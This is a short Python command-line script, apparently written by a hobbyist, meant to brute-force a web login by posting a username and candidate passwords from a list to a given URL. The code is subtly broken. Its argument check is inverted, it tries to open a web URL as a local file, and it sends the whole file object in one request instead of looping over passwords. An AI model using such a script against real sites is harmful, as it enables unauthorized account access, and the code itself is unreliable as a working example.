"""
    Title: bruteLogin
    Author: Carlos Mena
    Version: 1.0
    Description: CLI python script used for brute-force request logins to a specified URL.

	HOW TO USE:
	brutelogin.py <URL> <username> <user info> <password info> <file containing personal password list> (optional)

"""

import requests
import sys

# Arguments to variables
url = sys.argv[1]
userName = sys.argv[2]
userInfo = sys.argv[3]
passwordInfo = sys.argv[4]

def bruteLogin():
	# If arg 4 is not set, use default list
	if len(sys.argv[5]) <= 1:
		passwordList = sys.argv[5]
	else:
		passwordList = "https://github.com/carlosm00/pySec/blob/main/sources/possible_passwords.txt"


	with open(passwordList) as passwordSet:
		# Send request with each password
		requests.post(url, allow_redirects=False, data={
			userInfo: userName,
			passwordInfo: passwordSet
		})

		print('Testing %s', url)
		print('sending username %s and password %s', userName, passwordSet)


if __name__ == "__main__":
	bruteLogin()
